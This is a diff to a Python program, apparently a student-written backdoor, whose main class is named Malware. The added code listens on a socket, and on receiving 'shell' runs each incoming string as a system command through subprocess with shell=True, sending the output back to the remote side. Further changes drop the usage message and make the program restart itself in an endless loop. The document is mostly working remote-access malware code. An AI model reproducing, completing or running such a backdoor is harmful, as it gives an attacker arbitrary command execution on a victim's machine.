@@ -2,6 +2,8 @@ import threading
 import time
 import socket
 import sys
+import os
+import subprocess
 
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
@@ -14,13 +16,8 @@ remote_public_key = None
 public_key_pem = None
 private_key = None
 
-IN_PORT = 4445
-OUT_PORT = 4444
-
-
-def print_help():
-    print('Couldn\'t load program with arguments', ' '.join(sys.argv))
-    print('Usage : python3 <program_name> <victim_IP_address>')
+IN_PORT = 44455
+OUT_PORT = 44444
 
 
 class InThread(threading.Thread):
@@ -31,16 +28,16 @@ class InThread(threading.Thread):
         super().__init__()
         self.in_port = in_port
         self.socket = socket.socket()
-        self.start_inThread()
+        self.listen()
 
-    def start_inThread(self):
+    def listen(self):
         try:
             self.socket.bind(('', self.in_port))
             self.socket.listen(5)
             print('listening for incoming traffic')
             self.start()
-        except timeout:
-            self.start_inThread()
+        except socket.timeout:
+            self.listen()
 
     def run(self):
         conn, in_ip = self.socket.accept()
@@ -50,13 +47,31 @@ class InThread(threading.Thread):
         again = True
         while again:
             msg = conn.recv(1024).decode('UTF-8')
+            print(msg)
             if msg == 'exit':
                 again = False
+            elif msg == 'shell':
+                comm_again = True
+                while comm_again:
+                    command = conn.recv(1024).decode('UTF-8')
+                    print(command)
+                    if command == '':
+                        pass
+                    elif command == 'exit':
+                        comm_again = False
+                    else:
+                        try:
+                            resp = subprocess.check_output(command.split(), shell=True)
+                            print(command)
+                            print(resp)
+                            malw.send(resp.decode('cp850'))
+                        except subprocess.CalledProcessError:
+                            malw.send("Impossible d'exécuter cette commande")
             else:
-                print(msg)
+                pass
 
         self.socket.close()
-        print('Closed socket coming from {}'.format(self.in_addr))
+        print('Closed socket coming from {}'.format(in_ip))
 
     def init_public_key(self):
         try:
@@ -120,7 +135,8 @@ class OutThread(threading.Thread):
 
     def send(self, message):
         try:
-            self.sock.sendall(message.encode('UTF-8'))
+            #print('sending', message)
+            self.sock.sendall(message)
         except ConnectionError:
             print('Unable to send <<{}>> to {}'.format(message, self.ip))
 
@@ -142,11 +158,12 @@ class OutThread(threading.Thread):
                                              label=None))
 
 
-class Malware():
+class Malware(threading.Thread):
     global OUT_PORT
     global IN_PORT
 
     def __init__(self, out_port=OUT_PORT, in_port=IN_PORT):
+        super().__init__()
         self.ip = None
         self.out_port = out_port
         self.in_port = in_port
@@ -158,20 +175,22 @@ class Malware():
         global public_key_pem
         #private_key = self.generate_rsa_keys()
         #public_key_pem = self.serialize_public_key(private_key.public_key())
+        self.start()
 
     def start_out_thread(self, out_ip):
         self.ip = out_ip
         self.cons = OutThread(self.ip)
 
     def run(self):
-        self.prod.start()
-        self.cons.start()
-        if self.cons.is_alive():
-            self.cons.join()
+        #if self.cons.is_alive():
+        #    self.cons.join()
         if self.prod.is_alive():
             self.prod.join()
 
         self.stop()
+
+    def send(self, message):
+        self.cons.send(message.encode('UTF-8'))
 
     def stop(self):
         self.prod.stop()
@@ -188,7 +207,8 @@ class Malware():
             format=serialization.PublicFormat.SubjectPublicKeyInfo)
 
 
-if len(sys.argv) == 1:
+while True:
     malw = Malware()
-else:
-    print_help()
+    while malw.is_alive():
+        time.sleep(10)
+
